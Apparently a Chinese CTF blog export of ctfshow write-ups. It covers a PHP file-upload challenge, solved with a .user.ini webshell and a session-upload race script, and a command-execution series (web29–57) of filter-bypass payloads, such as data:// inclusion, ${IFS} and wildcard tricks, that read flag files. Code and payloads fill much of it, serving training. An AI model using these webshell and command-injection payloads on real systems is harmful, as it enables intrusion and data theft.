<p><img src="https://img.hzy2003628.top/9a442b12e1bde01036691be022cba313.png" alt="image-20220206170225325"></p>
<p>这道题只是简单的前端验证，解题步骤也就是这样！</p>
<h1 id="文件上传10后端校验">文件上传10–后端校验</h1>
<p>这个题没啥说的，思路和151一样，就不说了</p>
<p>----------------------------------------------------------------------------------------分割线--------------------------------------------------------------------------------------</p>
<p>上面是之前刷题的记录，这里从ctfshow的web162开始刷</p>
<h1 id="web162">web162</h1>
<p>这道题目也是上传.user.ini之后再上传图片🐎</p>
<p>这道题无非就是把点给过滤了，只需要上传的🐎不带点即可</p>
<p>.user.ini</p>
<pre><code class="hljs plaintext">GIF89a

auto_prepend_file=png</code></pre>
<p>png</p>
<pre><code class="hljs plaintext">GIF89a
&lt;?=require~%9b%9e%8b%9e%c5%d0%d0%8b%9a%87%8b%d0%8f%93%9e%96%91%d3%c3%c0%8f%97%8f%df%8c%86%8c%8b%9a%92%d7%d8%8b%9e%9c%df%d1%d1%d0%99%d5%d8%d6%c4%c0%c1?&gt;</code></pre>
<p>采用取反</p>
<pre><code class="hljs plaintext">&lt;?php
$a = &quot;data://text/plain,&lt;?php system(&#x27;tac ../f*&#x27;);?&gt;&quot;;
echo &quot;~(&quot;;
for ($i = 0; $i &lt; strlen($a); $i++) &#123;
    echo &quot;%&quot;.bin2hex(~$a[$i]);
&#125;
echo &quot;)&quot;;
</code></pre>
<p>脚本实现如下</p>
<pre><code class="hljs plaintext">import requests
import threading

rs = requests.session()
sess = &#x27;hahaha&#x27;
url = &quot;https://7129a574-6701-4301-b099-512ab7f25342.challenge.ctf.show/&quot;
data = &#123;
    &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: &#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;
&#125;
file = &#123;
    &#x27;file&#x27;: sess
&#125;
cookie = &#123;
    &#x27;PHPSESSID&#x27;: sess
&#125;


def write():
    while True:
        rs.post(url, data=data, files=file, cookies=cookie)


def read():
    while True:
        r = rs.get(url + &quot;/upload/index.php&quot;)
        if &#x27;flag&#x27; in r.text or &#x27;ctfshow&#x27; in r.text:
            print(r.text)
            exit()


threads = [threading.Thread(target=write),
           threading.Thread(target=read)]
for t in threads:
    t.start()

</code></pre>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOW命令执行</title>
    <url>/2022/03/15/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<p>ctfshow的命令执行</p>
<p><img src="http://img.hzy2003628.top/202207131247725.png" alt="image-20220713124728656" style="zoom:200%;"><span id="more"></span></p>
<h1 id="web29">web29</h1>
<p><img src="https://img.hzy2003628.top/8d4caca041a9a3e6f36bcb24a44c01bc.png" alt="image-20220315211906358" style="zoom:200%;">代码审计，eval函数的作用就是让输入的字符串当作php代码进行执行，get输参c系统命令，ls列目录<img src="https://img.hzy2003628.top/f9eef2b8a13da728e57a1ae848c4d0e0.png" alt="image-20220315212034460" style="zoom:200%;"></p>
<p>这代码里面对flag进行了过滤，可以用*或？进行绕过</p>
<img src="https://img.hzy2003628.top/21dd9210d8c7102aab8c9e674a385429.png" alt="image-20220315212224001" style="zoom:200%;">
<pre><code class="hljs plaintext">?c=system(&quot;ls&quot;);
?c=system(&quot;tac%20fla*.php&quot;);</code></pre>
<h1 id="web30">web30</h1>
<img src="https://img.hzy2003628.top/49b66b3c31b185d0b8e26f26db1e2a1d.png" alt="image-20220315212735626" style="zoom:200%;">
<p>发现flag，system，php这些字样都被过滤，那么就不能用系统命令来执行，但是据了解，php还支持一个执行运算符，就是反引号`,php会把反引号里面的内容当作shell命令去执行，从而替代了系统命令。echo函数的作用是输出一个或多个字符串，这里需要说一声，在执行命令的时候，这个反引号里面的内容并不是直接当成标准输出，而是当成一个变量进行输出。</p>
<img src="https://img.hzy2003628.top/06f51e4eece82d0efef543c9933e9daa.png" alt="image-20220315213907240" style="zoom:200%;">
<pre><code class="hljs plaintext">?c=echo`ls`;
？c=echo`tac fla*.p*p;</code></pre>
<p>然后后面的考察点和上一题一样</p>
<img src="https://img.hzy2003628.top/da9fe7cdf661be82de8cfcf0994552e9.png" alt="image-20220315213952047" style="zoom:200%;">
<h1 id="web31">web31</h1>
<img src="https://img.hzy2003628.top/fb238b0e6b75938e1f61bea264afd8a1.png" alt="image-20220315214138088" style="zoom:200%;">
<p>这个题过滤的更多，flag,system,php,cat,sort,shell，还过滤了空格，可以用<code>%09（代替空格）</code>绕过<img src="https://img.hzy2003628.top/9ef47f66aebceed4902232f6101d4945.png" alt="image-20220315214648820" style="zoom:200%;"></p>
<pre><code class="hljs plaintext">?c=echo`ls%09`;
?c=echo`tac%09fla*`;</code></pre>
<img src="https://img.hzy2003628.top/53678cc1d4e257af099b2f03920f63e2.png" alt="image-20220315214934150" style="zoom:200%;">
<h1 id="web32">web32</h1>
<img src="https://img.hzy2003628.top/2a4a3f816ac361ad4466f8a5bdc68d5b.png" alt="image-20220316195346562" style="zoom:200%;">
<p>这道题又增加了对echo的过滤，经查询发现php中不用括号的有echo以及include等等<img src="https://img.hzy2003628.top/8121e27f07570fe8cbf8f4f5371abdf3.png" alt="image-20220316195725337" style="zoom:200%;"></p>
<img src="https://img.hzy2003628.top/0d6c3811cd18c24b0b556dc240c61e62.png" alt="image-20220316200346650" style="zoom:200%;">
<p>这里学习到用<code>?&gt;</code>可以代替<code>;</code></p>
<p>所以这道题有两种解法，一种是利用文件包含的rce，</p>
<pre><code class="hljs plaintext">?c=include$_GET[0]?&gt;&amp;0=data://text/plain,&lt;?php phpinfo();?&gt;</code></pre>
<img src="https://img.hzy2003628.top/c8e15331b86308b52f65a31d9ec45030.png" alt="image-20220316200646145" style="zoom:200%;">
<p>或者利用php伪协议来读取php文件</p>
<pre><code class="hljs plaintext">?c=include$_GET[0]?&gt;&amp;0=php://filter/read=convert.base64-encode/resource=flag.php</code></pre>
<img src="https://img.hzy2003628.top/49300138b436c24095669283c1d12638.png" alt="image-20220316200947406" style="zoom:200%;">
<img src="https://img.hzy2003628.top/4704aa829762fd30f3e4da0b9809bb64.png" alt="image-20220316200955434" style="zoom:200%;">
<h1 id="web33">web33</h1>
<p>这道题和上道题相比多了个括号过滤，逃逸文件包含用不到括号所以解题思路跟上题一样</p>
<h1 id="web34">web34</h1>
<p>过滤时多过滤了一个=和一个&lt;，解题思路跟上题一样</p>
<h1 id="web35">web35</h1>
<p>过滤时多过滤了一个=和一个&lt;，解题思路跟上题一样</p>
<h1 id="web36">web36</h1>
<img src="https://img.hzy2003628.top/99948dc67e4db5ae36d1208366c34424.png" alt="image-20220316202435082" style="zoom: 200%;">
<p>这道题跟上面的也是一样，只不过因为又过滤了数字，所以把0改成字母就可！</p>
<h1 id="web37">web37</h1>
<img src="https://img.hzy2003628.top/f353f8310f2cd8d12c9a1bda85e2ed5b.png" alt="image-20220316202701784" style="zoom:200%;">
<p>这道题没有过滤太多东西，就过滤了个flag</p>
<pre><code class="hljs plaintext">/?c=data://text/plain,&lt;?php system(&quot;tac fla?.php&quot;);?&gt;
/?c=data:text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</code></pre>
<p>上面两种绕过方式就是举例，这道题的绕过方式很多。</p>
<img src="https://img.hzy2003628.top/f2fa7873ccd0a8162a365ff3711d5fdf.png" alt="image-20220316203257934" style="zoom:200%;">
<h1 id="web38">web38</h1>
<img src="https://img.hzy2003628.top/0f723d6cb99d899ad22d605e5590a019.png" alt="image-20220316203532744" style="zoom:200%;">
<p>发现过滤了flag，php，file，文件包含漏洞，输出flag</p>
<p>考虑到使用data协议，这道题因为过滤了php，所以要使用短标签</p>
<p>对于正常标签就是<code>&lt;?php</code>，而短标签就是<code>&lt;?</code></p>
<pre><code class="hljs plaintext">/?c=data://text/plain,&lt;?=system(&quot;ls&quot;);</code></pre>
<img src="https://img.hzy2003628.top/94e1f6a736c2e939cee8bb2716144f58.png" alt="image-20220316203905163" style="zoom:200%;">
<pre><code class="hljs plaintext">/?c=data://text/plain,&lt;?=system(&quot;tac fla*.p*p&quot;);</code></pre>
<img src="https://img.hzy2003628.top/db9d1e5814df930c26041aa1306c1b64.png" alt="image-20220316204110876" style="zoom:200%;">
<p>这道题也可以直接</p>
<pre><code class="hljs plaintext">?c=data://text/plain,&lt;?= system(&quot;cat fla*&quot;);?&gt;</code></pre>
<p>同样可以得到flag!</p>
<h1 id="web39">web39</h1>
<img src="https://img.hzy2003628.top/013e131d271ecbc26bb2e6c7b1b658c6.png" alt="image-20220316204532318" style="zoom:200%;">
<p>下面这是官方给的hint<img src="https://img.hzy2003628.top/e2e15d9ecaed7a149f3723250963d984.png" alt="image-20220316204558730" style="zoom:200%;"></p>
<p>这个跟上题解法一样</p>
<pre><code class="hljs plaintext">?c=data://text/plain,&lt;?= system(&quot;cat fla*&quot;);?&gt;</code></pre>
<p>然后查看源代码得到flag</p>
<img src="https://img.hzy2003628.top/9f9c1ee912a6e33521449880760432e0.png" alt="image-20220316204659428" style="zoom:200%;">
<h1 id="web40">web40</h1>
<img src="https://img.hzy2003628.top/ded4dd0594ed3aef1caa638d79bb8577.png" alt="image-20220316204834861" style="zoom:200%;">
<p>这道题过滤了很多字符，利用get_defined_vars()</p>
<pre><code class="hljs bash">？c=<span class="hljs-built_in">eval</span>(end(current(get_defined_vars())));&amp;a=system(<span class="hljs-string">&quot;ls&quot;</span>);</code></pre>
<img src="https://img.hzy2003628.top/f145f16b6d07a8189eeb8d3aed9cdcdf.png" alt="image-20220316205101652" style="zoom:200%;">
<p>tac得到flag<img src="https://img.hzy2003628.top/c1c5ea5790bdcc9977aead8aa41e9983.png" alt="image-20220316205117877" style="zoom:200%;"></p>
<h1 id="web41">web41</h1>
<img src="https://img.hzy2003628.top/e6e863fd38a2f236f8c5aef23db89cb6.png" alt="image-20220316205218255" style="zoom:200%;">
<p>这道题把数字和字母都过滤了，写个脚本</p>
<pre><code class="hljs plaintext">import re
import requests

url=&quot;http://2a2e4b71-f1ff-4953-8b14-bd26f6633fdc.challenge.ctf.show/&quot;

a=[]
ans1=&quot;&quot;
ans2=&quot;&quot;
for i in range(0,256):
    c=chr(i)
    tmp = re.match(r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;,c, re.I)
    if(tmp):
        continue
        #print(tmp.group(0))
    else:
        a.append(i)

# eval(&quot;echo($c);&quot;);
mya=&quot;system&quot;  #函数名 这里修改！
myb=&quot;ls&quot;      #参数
def myfun(k,my):
    global ans1
    global ans2
    for i in range (0,len(a)):
        for j in range(i,len(a)):
            if(a[i]|a[j]==ord(my[k])):
                ans1+=chr(a[i])
                ans2+=chr(a[j])
                return;
for k in range(0,len(mya)):
    myfun(k,mya)
data1=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;
ans1=&quot;&quot;
ans2=&quot;&quot;
for k in range(0,len(myb)):
    myfun(k,myb)
data2=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;

data=&#123;&quot;c&quot;:data1+data2&#125;
r=requests.post(url=url,data=data)
print(r.text)</code></pre>
<img src="https://img.hzy2003628.top/e03443bffc2b93a354cd9245bc3fd6e5.png" alt="image-20220316212021042" style="zoom:200%;">
<p>cat一下就出来了！</p>
<img src="https://img.hzy2003628.top/6349b7a1f7a464508d3d6902eed68e23.png" alt="image-20220316212108446" style="zoom:200%;">
<h1 id="web42">web42</h1>
<img src="https://img.hzy2003628.top/8f82c6e1adcc17bc9c23946b2289cf92.png" alt="image-20220316213345412" style="zoom:200%;">
<p>在给变量c赋值的语句下面的语句<code>”&gt;/dev/null 2&gt;&amp;1“</code> ，可以将其理解成将输入的数写入黑洞，也就是说只要执行一个命令都无效</p>
<blockquote>
<p>&gt;/dev/null   意思就是把错误输出到“黑洞”</p>
</blockquote>
<blockquote>
<p>/dev/null 2&gt;&amp;1 默认情况是1，也就是等同于1&gt;/dev/null 2&gt;&amp;1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”</p>
</blockquote>
<p>所以可以<code>?c=ls&amp;&amp;ls</code>,这里需要强调一下，需要先url编码之后再执行</p>
<img src="https://img.hzy2003628.top/8a196f16d56c47526e577a1b591d9434.png" alt="image-20220316213603124" style="zoom:200%;">
<img src="https://img.hzy2003628.top/c36e511882adc6f9cf919e8de3096d92.png" alt="image-20220316213710142" style="zoom:200%;">
<img src="https://img.hzy2003628.top/732f656ec3c69795aa2d18f620928af9.png" alt="image-20220316213616093" style="zoom:200%;">
<h1 id="web43">web43</h1>
<img src="https://img.hzy2003628.top/d40e7e6a684090e483c65cf7424df03e.png" alt="image-20220316214137648" style="zoom:200%;">
<p>过滤了<code>cat</code>和<code>；</code>，cat可以用tac代替，；可以用%0a代替</p>
<pre><code class="hljs plaintext">tac flag.php%0a</code></pre>
<img src="https://img.hzy2003628.top/69c8f7ae9e18b03dab3c1681f220fe38.png" alt="image-20220316214354134" style="zoom:200%;">
<h1 id="web44">web44</h1>
<img src="https://img.hzy2003628.top/a27e5dbd54acf589fb1e7d8a9b6e8c8d.png" alt="image-20220317193356268" style="zoom:200%;">
<p>过滤了flag以及cat，system‘函数将输入的参数的后面还是写入了黑洞，解决办法就是双写</p>
<table>
<thead>
<tr>
<th>2&gt;/dev/null</th>
<th>意思就是把错误输出到“黑洞”</th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt;/dev/null 2&gt;&amp;1</td>
<td>默认情况是1，也就是等同于1&gt;/dev/null 2&gt;&amp;1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”</td>
</tr>
<tr>
<td>-2&gt;&amp;1 &gt;/dev/null-</td>
<td>-意思就是把错误输出2重定向到标准出书1，也就是屏幕，标准输出进了“黑洞”，也就是标准输出进了黑洞，错误输出打印到屏幕-</td>
</tr>
</tbody>
</table>
<p>所以还是先跟上一题一样<code>?c=ls&amp;&amp;ls</code>,这里要求先进行url编码之后再执行<img src="https://img.hzy2003628.top/8e690f1dee034b6a292b16962ec575ef.png" alt="image-20220317193902380" style="zoom:200%;"></p>
<img src="https://img.hzy2003628.top/50bf35aa71f32d8b8898abbf1af5b715.png" alt="image-20220317193933690" style="zoom:200%;">
<p>但是因为已经过滤了cat，所以用tac！！<img src="https://img.hzy2003628.top/dd428aac1fe3a23e2472ad64f8ed63eb.png" alt="image-20220317194121118" style="zoom:200%;"></p>
<h1 id="web45">web45</h1>
<img src="https://img.hzy2003628.top/91f8fd096dc761d316e04082ab96a44e.png" alt="image-20220317194219994" style="zoom:200%;">
<p>一如既往，这道题过滤了;，cat，flag还有空格，同时又写入黑洞，用上一题的方法依旧可以回显[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-jhIDgLIA-1648814972961)(<a href="https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220317194335.png">https://gitee.com/hzy2003628/drawing-bed/raw/master/images/20220317194335.png</a>)]</p>
<p>但是读取的时候原来的方法不再出现回显<img src="https://img.hzy2003628.top/f7bd2666d0005d17de0d3f0e111d55ad.png" alt="image-20220317194518987" style="zoom:200%;"></p>
<blockquote>
<p>&amp;&amp;代表执行两个命令，让后面的命令进入黑洞，以便于能够正常执行前面的命令，这道题因为过滤了空格，所以用tab制表符代替空格，%09就是tab制表符的url编码</p>
</blockquote>
<img src="https://img.hzy2003628.top/8fa5886555606cf662702a5e6722af0f.png" alt="image-20220317194848055" style="zoom:200%;">
<h1 id="web46">web46</h1>
<img src="https://img.hzy2003628.top/1b08bff107b4ce047fd26c352cf7c205.png" alt="image-20220317194929182" style="zoom:200%;">
<p>过滤了；，cat，flag，数字，*，$</p>
<p>发现上一题的payload照样可以用<img src="https://img.hzy2003628.top/5ae537cf15579a2f84cf69fb9fd71ad6.png" alt="image-20220317195114914" style="zoom:200%;"></p>
<img src="https://img.hzy2003628.top/628c7be0f568e24c4a54e05eb1231e31.png" alt="image-20220317195144560" style="zoom:200%;">
<h1 id="web47">web47</h1>
<img src="https://img.hzy2003628.top/e9606c89cf607497ad0976a8fdc90ec3.png" alt="image-20220317195227814" style="zoom:200%;">
<p>过滤了一些字符，但是貌似用不到这些字符，用同样的方法依然可以解决！</p>
<img src="https://img.hzy2003628.top/1992209a89547ec71e3b0ee4f80bdd4c.png" alt="image-20220317195319376" style="zoom:200%;">
<img src="https://img.hzy2003628.top/a309c7c5cd0f9fd56d45e46744296d2f.png" alt="image-20220317195343908" style="zoom:200%;">
<p>学习一下新知识，这道题还可以<code>nl&lt;fla''g.php||</code></p>
<p>nl查看源代码，&lt;代替空格，''分割flag过滤，||解决命令黑洞</p>
<h1 id="web48">web48</h1>
<img src="https://img.hzy2003628.top/1d011403823db103cb19838b649010ad.png" alt="image-20220317195458944" style="zoom:200%;">
<img src="https://img.hzy2003628.top/76717f7b23234c9fc27b2ce603d37d8a.png" alt="image-20220317195609287" style="zoom:200%;">
<img src="https://img.hzy2003628.top/bc75834146a1b66907eb58bb143ac163.png" alt="image-20220317195633101" style="zoom:200%;">
<p>过滤的字符对这种绕过方法不受影响，所以前面的解法依然适用！</p>
<h1 id="web49">web49</h1>
<img src="https://img.hzy2003628.top/2ca73d8666b25961bed13bb3860ebba1.png" alt="image-20220317195746781" style="zoom:200%;">
<p>解法同上！</p>
<p>当然下面的官方给的hint方法也可以<img src="https://img.hzy2003628.top/bf746cf44b25e105991a9c19ac641211.png" alt="image-20220317200009855" style="zoom:200%;"></p>
<h1 id="web50">web50</h1>
<img src="https://img.hzy2003628.top/9bb8438157b0435779cf1cf2ab96249f.png" alt="image-20220317200050967" style="zoom:200%;">
<p>这道题不能用前面的方法来解决了，因为过滤了%</p>
<p>这个时候就需要使用其他过滤方法绕过，上面有一题提到了一种其他解法，<code>/?c=ls&lt;p||</code>,盲猜这题应该也是又php文件，所以ls所有带p的<img src="https://img.hzy2003628.top/5abdeaf597ff8bb7db2028c6f0d4502c.png" alt="image-20220317200735399" style="zoom:200%;"></p>
<blockquote>
<p><code>nl</code>命令在linux系统中用来计算文件中行号。<code>nl</code>可以将输出的文件内容自动的加上行号。<br>
<code>&lt;</code> 表示的是输入重定向的意思，就是把<code>&lt;</code>后面跟的文件取代键盘作为新的输入设备。<br>
所以可以使用<code>&lt;</code>或者<code>&lt;&gt;</code>绕过空格，使用<code>\</code>插入到flag中</p>
</blockquote>
<p>然后<code>/?c=nl&lt;fla\g.php||</code><img src="https://img.hzy2003628.top/5f10d7d33ae9060c1a33a7236533a6c3.png" alt="image-20220317201124402" style="zoom:200%;"></p>
<h1 id="web51">web51</h1>
<img src="https://img.hzy2003628.top/ba46845acd31cdeec872d5664e317d63.png" alt="image-20220317201208986" style="zoom:200%;">
<p>这道题把tac也过滤了！</p>
<p>这里可以输上题的payload，但是回显是1,考虑到1就是正确，查看源代码即可得到flag！<img src="https://img.hzy2003628.top/06e907ef1bfc6ba521add1cfe22228e4.png" alt="image-20220317201856660" style="zoom:200%;"></p>
<p>我用的tac的payload，因为过滤了tac所以可以在tac中间插入<code>\</code></p>
<p><code>/?c=ta\c&lt;fla\g.php||</code></p>
<img src="https://img.hzy2003628.top/c129dd048e9c81d3efbe53607d39a776.png" alt="image-20220317201524099" style="zoom:200%;">
<h1 id="web52">web52</h1>
<img src="https://img.hzy2003628.top/dd661f49ac6f648145dab2ded1127624.png" alt="image-20220317201932533" style="zoom:200%;">
<p>这道题把&lt;&gt;也过滤了</p>
<blockquote>
<p>那么使用<code>$&#123;IFS&#125;</code>绕过空格。</p>
<p>关于IFS的解释：<br>
Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。</p>
<p>而 IFS 是一种 set 变量，当 shell 处理&quot;命令替换&quot;和&quot;参数替换&quot;时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。</p>
</blockquote>
<pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=ta\c<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fla\g.php|<span class="hljs-params"></span>|</code></pre>
<p>但是发现不在这里，又进行逐层寻找，最终找到flag</p>
<img src="https://img.hzy2003628.top/56321b27a3256ee45732febdc2dd92f5.png" alt="image-20220317202637315" style="zoom:200%;">
<p>tac一下得到flag！这里不要忘记过滤了flag还有tac都需要插入\来进行过滤！<img src="https://img.hzy2003628.top/334a02535152d1c348789b8ec10d3dae.png" alt="image-20220317202754220" style="zoom:200%;"></p>
<h1 id="web53">web53</h1>
<img src="https://img.hzy2003628.top/266449a3160df2e9231aa4296bdf66ef.png" alt="image-20220317202834683" style="zoom:200%;">
<p>这道题不再有黑洞了，不用绕黑洞了！上题的payload这题照样适用，把绕黑洞的去掉就可！</p>
<blockquote>
<p>/?c=nl${IFS}fla\g.php</p>
</blockquote>
<img src="https://img.hzy2003628.top/88f707429c7cf2cbb15aa7e0420e48fc.png" alt="image-20220317203157699" style="zoom:200%;">
<blockquote>
<p>/?c=ta\c${IFS}fla\g.php</p>
</blockquote>
<img src="https://img.hzy2003628.top/c87c68d0f939c9698471b2cf598bae4f.png" alt="image-20220317203250780" style="zoom:200%;">
<h1 id="web54">web54</h1>
<img src="https://img.hzy2003628.top/14db4709ceefeac3acf24a054f30ccbe.png" alt="image-20220317203610103" style="zoom:200%;">
<p>可以使用<code>mv</code>命令：<br>
<code>mv</code>命令用来为文件或目录改名、或将文件或目录移入其它位置。</p>
<pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=mv<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;fl?g.php<span class="hljs-variable">$&#123;</span><span class="hljs-variable constant_">IFS</span>&#125;a.txt</code></pre>
<p>然后flag.php就改名为a.txt，然后直接访问就可得到flag！</p>
<p>、<img src="https://img.hzy2003628.top/e837bd3b08b454d24535a7c6106360c1.png" alt="image-20220317203859480" style="zoom:200%;"></p>
<h1 id="web55">web55</h1>
<img src="https://img.hzy2003628.top/653d377c2685bb62476c10de14885d8b.png" alt="image-20220317203934001" style="zoom:200%;">
<p>这个过滤了所有的字母</p>
<pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-regexp">/???/</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-number">64</span> <span class="hljs-string">??</span><span class="hljs-string">??</span>.<span class="hljs-string">??</span>?                     <span class="hljs-regexp">//</span>也就是<span class="hljs-string">?c</span>=<span class="hljs-regexp">/bin/base</span>64 flag.php</code></pre>
<blockquote>
<p>通过匹配bin下存在的命令进行读取flag。<br>
bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>
我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</p>
</blockquote>
<img src="https://img.hzy2003628.top/e679879b1ff44565794c5d7cd390f6f5.png" alt="image-20220317204237757" style="zoom:200%;">
<p>解码得到flag！<img src="https://img.hzy2003628.top/4bd5ac966929899e17bbcc5d947542f8.png" alt="image-20220317204255791" style="zoom:200%;"></p>
<h1 id="web56">web56</h1>
<img src="https://img.hzy2003628.top/50103b39becb5108db93629fa923e5ff.png" alt="image-20220317204357217" style="zoom:200%;">
<p>还是过滤了所有的字母！</p>
<p>抓包后西显示如下</p>
<img src="https://img.hzy2003628.top/aec14bda1c19a17cd006cd8c533b6f22.png" alt="image-20220317205344974" style="zoom:200%;">
<p>构造poc执行命令</p>
<p><code>?c=.+/???/????????[@-[]</code><br>
注：后面的<code>[@-[]</code>是linux下面的匹配符，是进行匹配的大写字母。<br>
<img src="https://img.hzy2003628.top/fc24d532365665aa4feb4eb5f68c148a.png" alt="在这里插入图片描述" style="zoom:200%;"></p>
<p>在这个之前我们需要构造一个post上传文件的数据包。</p>
<pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>
<span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<img src="https://img.hzy2003628.top/5d0a189864b60fed0efa71988d1409f5.png" alt="image-20220317210103212" style="zoom:200%;">
<p>然后抓包<img src="https://img.hzy2003628.top/d42c31629e42fd43a2f4a2f25dd8226a.png" alt="image-20220317210115562" style="zoom:200%;"></p>
<p>暂时没有找到解决办法！</p>
<h1 id="web57">web57</h1>
<img src="https://img.hzy2003628.top/6b8776aa23c748db493c184e3d4be008.png" alt="image-20220317210950317" style="zoom:200%;">
<p>里面有个提示flag就在36.php里，</p>
<p>已知</p>
<pre><code class="hljs bash">┌──(amateur㉿kali)-[~]
└─$ <span class="hljs-built_in">echo</span> $((~$(()))) 
-1                                                   
┌──(amateur㉿kali)-[~]
└─$ <span class="hljs-built_in">echo</span> $((~$(($((~$(())))+$((~$(())))))))            
1                                                     
┌──(amateur㉿kali)-[~]
└─$ <span class="hljs-built_in">echo</span> $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))
2</code></pre>
<p>所以访问36.php只需要将里面的元素复制到36个，编写python脚本生成，上传得到flag</p>
<hr>
<p>python脚本：</p>
<pre><code class="hljs python">s1 = <span class="hljs-string">&quot;$((~$((&quot;</span>
s2 = <span class="hljs-string">&quot;&quot;</span>
lils2 = <span class="hljs-string">&quot;$((~$(())))&quot;</span>
s3 = <span class="hljs-string">&quot;))))&quot;</span>

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">37</span>):
    s2 += lils2

<span class="hljs-built_in">print</span>(s1+s2+s3)</code></pre>
<p>输出：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</p>
<img src="https://img.hzy2003628.top/72f1c7418e57fbdada323e88285b038e.png" alt="image-20220317211444172" style="zoom:200%;">
<p>验证：</p>
<pre><code class="hljs bash">┌──(amateur㉿kali)-[~]
